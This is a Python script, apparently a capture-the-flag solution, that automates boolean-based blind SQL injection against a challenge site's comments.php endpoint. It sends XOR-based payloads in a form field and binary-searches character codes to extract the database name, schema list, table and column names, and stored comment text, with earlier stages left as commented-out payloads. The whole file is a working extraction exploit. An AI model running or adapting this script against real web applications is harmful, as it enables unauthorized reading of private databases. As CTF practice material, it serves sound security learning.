import requests
import time

response= requests.Session()
url = 'http://1720db40-ef12-4f12-8524-f38fde08aca7.node4.buuoj.cn:81/comments.php'
flag = ''
i = 0
n = 0
while n == 0:
    i = i + 1
    low = 32
    high = 128
    while low < high:
        mid = (low + high) // 2
        # payload = f"1^(ascii(substr((select(database())),{i},1))>{mid})"
        # payload = f"1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{i},1))>{mid})+'0"
        # payload = f"1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})"
        payload = f"1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='wfy_comments')),{i},1))>{mid})"
        #payload = f"1^(ascii(substr((select(group_concat(text))from(wfy_comments)where(id=100)),{i},1))>{mid})"
        data = {
            "name": payload
        }
        res = response.post(url=url, data=data)
        res.encoding = "utf-8"
        #print(payload)
        if '好耶' in res.text:
            high = mid
        else:
            low = mid + 1
        time.sleep(0.2)
    if low != 32:
        flag += chr(low)
        print(flag)
    else:
        break
print(flag)